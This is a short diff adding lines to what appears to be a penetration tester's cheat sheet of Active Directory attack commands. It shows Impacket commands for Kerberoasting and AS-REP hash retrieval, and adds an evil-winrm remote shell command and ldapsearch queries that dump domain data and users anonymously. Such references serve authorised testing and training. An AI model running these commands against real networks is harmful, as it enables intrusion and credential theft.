@@ -73,3 +73,11 @@ GetUserSPNs.py '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <
 # GetNPUsers.py get all users and hashes in AD that have NO preauthentication enabled
 GetNPUsers.py '<fqdn>/[<username>]'  -dc-ip <dc-ip> [-request -outputfile <out-file>]
 
+# evil-winrm interactive shell with username and password
+evil-winrm -i <target-ip> -u <username> -p <password>
+
+# ldapsearch dump raw AD information from DC anonymously
+ldapsearch -x -H ldap://<dc-ip> -b '' -s base '(objectclass=*)'
+
+# ldapsearch raw raw AD users from DC anonymously
+ldapsearch -x -H ldap://<dc-ip> -b 'DC=<domain>,DC=<domain-suffix>' '(objectClass=person)'
